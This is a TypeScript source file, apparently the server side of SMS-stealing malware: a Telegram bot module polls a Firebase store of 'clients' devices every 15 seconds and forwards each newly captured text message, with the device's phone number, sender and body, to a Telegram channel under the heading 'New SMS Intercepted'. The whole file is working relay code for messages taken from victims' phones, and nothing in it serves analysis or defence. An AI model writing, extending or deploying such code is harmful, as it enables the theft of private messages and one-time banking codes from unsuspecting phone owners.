import { Telegraf } from "telegraf";
import { logger } from "../lib/logger";
import {
  fbGet,
  getSmsChannel,
  getSmsWatermarks,
  setSmsWatermark,
} from "./firebase";

const POLL_INTERVAL = 15_000; // 15 seconds

function escapeMarkdown(text: string): string {
  return text.replace(/[_*[\]()~`>#+\-=|{}.!]/g, "\\$&");
}

export function startSmsWatcher(bot: Telegraf): void {
  let watermarks: Record<string, number> = {};
  let ready = false;

  async function init() {
    try {
      const saved = await getSmsWatermarks();
      watermarks = saved;

      // Seed watermarks for devices that have no entry yet → don't forward historical SMS
      const clients = await fbGet("clients");
      if (clients) {
        for (const deviceId of Object.keys(clients)) {
          if (watermarks[deviceId] === undefined) {
            watermarks[deviceId] = Date.now();
          }
        }
      }
      ready = true;
      logger.info("SMS watcher initialized");
    } catch (err) {
      logger.error({ err }, "SMS watcher init error");
      ready = true; // proceed anyway
    }
  }

  async function poll() {
    if (!ready) return;

    try {
      const channelId = await getSmsChannel();
      if (!channelId) return;

      const clients = await fbGet("clients");
      if (!clients) return;

      for (const [deviceId, deviceData] of Object.entries(
        clients as Record<string, any>
      )) {
        const smsData = (deviceData as any)?.sms;
        if (!smsData) continue;

        // New device seen for the first time → just set watermark, don't forward
        if (watermarks[deviceId] === undefined) {
          const timestamps = Object.values(smsData).map((s: any) =>
            parseInt(s.date || "0", 10)
          );
          watermarks[deviceId] =
            timestamps.length > 0 ? Math.max(...timestamps) : Date.now();
          await setSmsWatermark(deviceId, watermarks[deviceId]);
          continue;
        }

        const lastWatermark = watermarks[deviceId];

        const newEntries = Object.values(smsData)
          .filter(
            (sms: any) => parseInt(sms.date || "0", 10) > lastWatermark
          )
          .sort(
            (a: any, b: any) =>
              parseInt(a.date || "0") - parseInt(b.date || "0")
          );

        if (newEntries.length === 0) continue;

        let latestTs = lastWatermark;

        for (const sms of newEntries as any[]) {
          const ts = parseInt(sms.date || "0", 10);
          const phone = (deviceData as any).phone || deviceId;
          const from = sms.from || "Unknown";
          const body = sms.body || "";
          const dateStr = ts
            ? new Date(ts).toLocaleString("en-IN", {
                timeZone: "Asia/Kolkata",
              }) + " IST"
            : "Unknown";

          const msg =
            `📨 *New SMS Intercepted*\n\n` +
            `📱 Device: \`${escapeMarkdown(phone)}\`\n` +
            `👤 From: \`${escapeMarkdown(from)}\`\n` +
            `🕐 ${dateStr}\n\n` +
            `💬 *Message:*\n${escapeMarkdown(body)}`;

          try {
            await bot.telegram.sendMessage(channelId, msg, {
              parse_mode: "Markdown",
            });
            if (ts > latestTs) latestTs = ts;
          } catch (err: any) {
            logger.error({ err, channelId }, "Failed to forward SMS to channel");
            // Bot not in channel or bad ID — stop trying this cycle
            if (
              err?.response?.error_code === 400 ||
              err?.response?.error_code === 403
            ) {
              break;
            }
          }

          // Rate limit — small delay between messages
          await new Promise((r) => setTimeout(r, 400));
        }

        if (latestTs > lastWatermark) {
          watermarks[deviceId] = latestTs;
          await setSmsWatermark(deviceId, latestTs);
        }
      }
    } catch (err) {
      logger.error({ err }, "SMS watcher poll error");
    }
  }

  init().then(() => {
    setInterval(poll, POLL_INTERVAL);
    poll(); // immediate first poll after init
  });

  logger.info("SMS watcher started (polling every 15s)");
}
